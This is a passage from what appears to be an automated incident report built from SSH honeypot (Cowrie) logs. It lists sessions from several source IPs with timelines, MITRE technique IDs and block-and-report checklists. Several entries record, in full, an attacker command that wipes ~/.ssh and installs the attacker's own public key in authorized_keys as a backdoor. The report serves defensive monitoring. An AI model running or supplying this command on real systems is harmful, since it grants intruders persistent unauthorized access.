| `2026-06-09 11:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.224[.]96` to AbuseIPDB if not already reported
- [ ] Block `106.75.224[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5bb0da865db

| Field | Detail |
|---|---|
| **Source IP** | `106.75.224[.]96` |
| **First Seen** | 2026-06-09 11:58 |
| **Last Seen** | 2026-06-09 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:58:43` | `cowrie.session.connect` |
| `2026-06-09 11:58:43` | `cowrie.client.version` |
| `2026-06-09 11:58:43` | `cowrie.client.kex` |
| `2026-06-09 11:58:44` | `cowrie.login.success` |
| `2026-06-09 11:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.224[.]96` to AbuseIPDB if not already reported
- [ ] Block `106.75.224[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43edc1bb255

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:03 |
| **Last Seen** | 2026-06-09 12:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:03:55` | `cowrie.session.connect` |
| `2026-06-09 12:03:55` | `cowrie.client.version` |
| `2026-06-09 12:03:55` | `cowrie.client.kex` |
| `2026-06-09 12:03:56` | `cowrie.login.success` |
| `2026-06-09 12:03:57` | `cowrie.session.params` |
| `2026-06-09 12:03:57` | `cowrie.command.input` |
| `2026-06-09 12:03:57` | `cowrie.command.failed` |
| `2026-06-09 12:03:57` | `cowrie.log.closed` |
| `2026-06-09 12:03:58` | `cowrie.session.params` |
| `2026-06-09 12:03:58` | `cowrie.command.input` |
| `2026-06-09 12:03:58` | `cowrie.session.file_download` |
| `2026-06-09 12:03:58` | `cowrie.log.closed` |
| `2026-06-09 12:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d194737622

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:04 |
| **Last Seen** | 2026-06-09 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:04:01` | `cowrie.session.connect` |
| `2026-06-09 12:04:01` | `cowrie.client.version` |
| `2026-06-09 12:04:01` | `cowrie.client.kex` |
| `2026-06-09 12:04:03` | `cowrie.login.success` |
| `2026-06-09 12:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adad5aa2bb4a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]155` |
| **First Seen** | 2026-06-09 12:08 |
| **Last Seen** | 2026-06-09 12:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:08:08` | `cowrie.session.connect` |
| `2026-06-09 12:08:08` | `cowrie.client.version` |
| `2026-06-09 12:08:08` | `cowrie.client.kex` |
| `2026-06-09 12:08:09` | `cowrie.login.success` |
| `2026-06-09 12:08:09` | `cowrie.session.params` |
| `2026-06-09 12:08:09` | `cowrie.command.input` |
| `2026-06-09 12:08:09` | `cowrie.command.failed` |
| `2026-06-09 12:08:09` | `cowrie.log.closed` |
| `2026-06-09 12:08:09` | `cowrie.session.params` |
| `2026-06-09 12:08:09` | `cowrie.command.input` |
| `2026-06-09 12:08:09` | `cowrie.session.file_download` |
| `2026-06-09 12:08:09` | `cowrie.log.closed` |
| `2026-06-09 12:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9224eafc6925

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 12:08 |
| **Last Seen** | 2026-06-09 12:08 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:08:14` | `cowrie.session.connect` |
| `2026-06-09 12:08:15` | `cowrie.client.version` |
| `2026-06-09 12:08:15` | `cowrie.client.kex` |
| `2026-06-09 12:08:20` | `cowrie.login.success` |
| `2026-06-09 12:08:23` | `cowrie.session.params` |
| `2026-06-09 12:08:23` | `cowrie.command.input` |
| `2026-06-09 12:08:23` | `cowrie.command.failed` |
| `2026-06-09 12:08:24` | `cowrie.log.closed` |
| `2026-06-09 12:08:26` | `cowrie.session.params` |
| `2026-06-09 12:08:26` | `cowrie.command.input` |
| `2026-06-09 12:08:28` | `cowrie.session.file_download` |
| `2026-06-09 12:08:28` | `cowrie.log.closed` |
| `2026-06-09 12:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd1d5c56abc

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]155` |
| **First Seen** | 2026-06-09 12:08 |
| **Last Seen** | 2026-06-09 12:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:08:15` | `cowrie.session.connect` |
| `2026-06-09 12:08:15` | `cowrie.client.version` |
| `2026-06-09 12:08:15` | `cowrie.client.kex` |
| `2026-06-09 12:08:16` | `cowrie.login.success` |
| `2026-06-09 12:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e4851919b0

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 12:08 |
| **Last Seen** | 2026-06-09 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:08:40` | `cowrie.session.connect` |
| `2026-06-09 12:08:41` | `cowrie.client.version` |
| `2026-06-09 12:08:41` | `cowrie.client.kex` |
| `2026-06-09 12:08:44` | `cowrie.login.success` |
| `2026-06-09 12:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f5609503082

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:09 |
| **Last Seen** | 2026-06-09 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:09:41` | `cowrie.session.connect` |
| `2026-06-09 12:09:41` | `cowrie.client.version` |
| `2026-06-09 12:09:41` | `cowrie.client.kex` |
| `2026-06-09 12:09:41` | `cowrie.login.success` |
| `2026-06-09 12:09:41` | `cowrie.session.params` |
| `2026-06-09 12:09:41` | `cowrie.command.input` |
| `2026-06-09 12:09:41` | `cowrie.command.failed` |
| `2026-06-09 12:09:41` | `cowrie.log.closed` |
| `2026-06-09 12:09:41` | `cowrie.session.params` |
| `2026-06-09 12:09:41` | `cowrie.command.input` |
| `2026-06-09 12:09:41` | `cowrie.session.file_download` |
| `2026-06-09 12:09:41` | `cowrie.log.closed` |
| `2026-06-09 12:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7912be1e63a

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:09 |
| **Last Seen** | 2026-06-09 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:09:43` | `cowrie.session.connect` |
| `2026-06-09 12:09:43` | `cowrie.client.version` |
| `2026-06-09 12:09:43` | `cowrie.client.kex` |
| `2026-06-09 12:09:43` | `cowrie.login.success` |
| `2026-06-09 12:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2917af19082

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:14 |
| **Last Seen** | 2026-06-09 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:14:04` | `cowrie.session.connect` |
| `2026-06-09 12:14:04` | `cowrie.client.version` |
| `2026-06-09 12:14:04` | `cowrie.client.kex` |
| `2026-06-09 12:14:04` | `cowrie.login.success` |
| `2026-06-09 12:14:04` | `cowrie.session.params` |
| `2026-06-09 12:14:04` | `cowrie.command.input` |
| `2026-06-09 12:14:04` | `cowrie.command.failed` |
| `2026-06-09 12:14:04` | `cowrie.log.closed` |
| `2026-06-09 12:14:05` | `cowrie.session.params` |
| `2026-06-09 12:14:05` | `cowrie.command.input` |
| `2026-06-09 12:14:05` | `cowrie.session.file_download` |
| `2026-06-09 12:14:05` | `cowrie.log.closed` |
| `2026-06-09 12:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe1579091ea

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:14 |
| **Last Seen** | 2026-06-09 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:14:06` | `cowrie.session.connect` |
| `2026-06-09 12:14:06` | `cowrie.client.version` |
| `2026-06-09 12:14:06` | `cowrie.client.kex` |
| `2026-06-09 12:14:06` | `cowrie.login.success` |
| `2026-06-09 12:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bef5e941374

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:14 |
| **Last Seen** | 2026-06-09 12:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:14:27` | `cowrie.session.connect` |
| `2026-06-09 12:14:27` | `cowrie.client.version` |
| `2026-06-09 12:14:27` | `cowrie.client.kex` |
| `2026-06-09 12:14:28` | `cowrie.login.success` |
| `2026-06-09 12:14:29` | `cowrie.session.params` |
| `2026-06-09 12:14:29` | `cowrie.command.input` |
| `2026-06-09 12:14:29` | `cowrie.command.failed` |
| `2026-06-09 12:14:30` | `cowrie.log.closed` |
| `2026-06-09 12:14:30` | `cowrie.session.params` |
| `2026-06-09 12:14:30` | `cowrie.command.input` |
| `2026-06-09 12:14:30` | `cowrie.session.file_download` |
| `2026-06-09 12:14:30` | `cowrie.log.closed` |
| `2026-06-09 12:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938e5ccdfc6d

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:14 |
| **Last Seen** | 2026-06-09 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:14:33` | `cowrie.session.connect` |
| `2026-06-09 12:14:33` | `cowrie.client.version` |
| `2026-06-09 12:14:34` | `cowrie.client.kex` |
| `2026-06-09 12:14:35` | `cowrie.login.success` |
| `2026-06-09 12:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73df498ecedd

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:16 |
| **Last Seen** | 2026-06-09 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:16:20` | `cowrie.session.connect` |
| `2026-06-09 12:16:20` | `cowrie.client.version` |
| `2026-06-09 12:16:20` | `cowrie.client.kex` |
| `2026-06-09 12:16:21` | `cowrie.login.success` |
| `2026-06-09 12:16:21` | `cowrie.session.params` |
| `2026-06-09 12:16:21` | `cowrie.command.input` |
| `2026-06-09 12:16:21` | `cowrie.command.failed` |
| `2026-06-09 12:16:21` | `cowrie.log.closed` |
| `2026-06-09 12:16:21` | `cowrie.session.params` |
| `2026-06-09 12:16:21` | `cowrie.command.input` |
| `2026-06-09 12:16:21` | `cowrie.session.file_download` |
| `2026-06-09 12:16:21` | `cowrie.log.closed` |
| `2026-06-09 12:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ee6af6b63e

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:16 |
| **Last Seen** | 2026-06-09 12:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:16:22` | `cowrie.session.connect` |
| `2026-06-09 12:16:22` | `cowrie.client.version` |
| `2026-06-09 12:16:22` | `cowrie.client.kex` |
| `2026-06-09 12:16:22` | `cowrie.login.success` |
| `2026-06-09 12:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-080f5643aacd

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:17 |
| **Last Seen** | 2026-06-09 12:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:17:59` | `cowrie.session.connect` |
| `2026-06-09 12:17:59` | `cowrie.client.version` |
| `2026-06-09 12:17:59` | `cowrie.client.kex` |
| `2026-06-09 12:18:00` | `cowrie.login.success` |
| `2026-06-09 12:18:01` | `cowrie.session.params` |
| `2026-06-09 12:18:01` | `cowrie.command.input` |
| `2026-06-09 12:18:01` | `cowrie.command.failed` |
| `2026-06-09 12:18:02` | `cowrie.log.closed` |
| `2026-06-09 12:18:02` | `cowrie.session.params` |
| `2026-06-09 12:18:02` | `cowrie.command.input` |
| `2026-06-09 12:18:02` | `cowrie.session.file_download` |
| `2026-06-09 12:18:02` | `cowrie.log.closed` |
| `2026-06-09 12:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b2c28f9f2d

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:18 |
| **Last Seen** | 2026-06-09 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:18:05` | `cowrie.session.connect` |
| `2026-06-09 12:18:05` | `cowrie.client.version` |
| `2026-06-09 12:18:06` | `cowrie.client.kex` |
| `2026-06-09 12:18:07` | `cowrie.login.success` |
| `2026-06-09 12:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d010e3d59510

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:18 |
| **Last Seen** | 2026-06-09 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
